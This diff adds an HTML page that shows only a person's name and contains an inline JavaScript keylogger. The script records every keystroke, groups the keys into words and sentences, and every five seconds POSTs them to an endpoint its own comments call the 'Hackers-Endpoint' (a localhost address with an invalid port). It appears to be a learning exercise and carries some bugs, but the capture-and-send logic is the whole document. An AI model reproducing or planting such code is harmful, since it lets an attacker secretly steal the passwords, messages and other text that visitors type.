@@ -1,0 +1,83 @@
+<!doctype html>
+<html class="no-js" lang="">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title></title>
+  <link rel="stylesheet" href="css/normalize.css">
+  <link rel="stylesheet" href="css/main.css">
+</head>
+
+<body>
+  <p>Timon Iori</p>
+  
+  <script type="text/javascript">
+  
+	var word = "";
+	var sentence = "";
+	var text = "";
+	
+	// Add Event Listener to all Keyboard Events 
+	document.addEventListener("keydown", function (e) {
+		// Log the results to the Developer Console of the Browser (Press: F12)
+		var character_code = event.which || event.keyCode; // depending on browser-support
+		var character_value = String.fromCharCode(character_code);
+		
+		console.log("Current Character: " + character_code + " " + character_value);
+		
+		// Collect charachters anyway
+		word = word + character_value;
+		
+		// In case a space was entered -> indication for a word
+		if(character_code == 32)
+		{
+			console.log("Word: " + word);
+			sentence += word; 
+			word = "";
+		}
+		
+		// In case a "." or a an "ENTER" was entered _> indication that the sentence has finished
+		if(character_code == 13  || character_code == 190)
+		{
+			console.log("Sentence: " + sentence);
+			text += sentence + word; // get the last word as well 
+			word = "";
+			sentence = "";
+		}
+		
+		// character code 8 is backspace, why doesnt this work? it deteletes the whole word..
+		if(character_code == 8)
+		{
+			// i take word.length -2 instead of -1 because it saves backspace as character too and needs to be deleted.
+			word = word.substring(0, word.length-2);
+			console.log("Last Letter was deleted");
+		}
+	});
+	
+	setInterval(function(){
+	
+		if(text.length > 0)
+		{
+		
+		// 8.1 (debug): log the results in the console
+		// click F12 in Browser in order to open the Web-Console 
+		console.log("Text for Submission: " + text);
+		
+		// 8.2 Send the values to the Hackers-Endpoint. In our case our own .NET MVC Application
+		var xhr = new XMLHttpRequest();
+		xhr.open('POST', 'http://localhost:499670/API/CollectKeyLogging');
+		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+		xhr.send('sentence=' + sentence);
+		
+		//resets value 
+		text =""; 
+		sentence =""; 
+		word = ""; 
+		}
+	}, 5000); // check every 5 seconds, whether there is something to submit
+
+  </script>
+  
+  
+</body>
+</html>
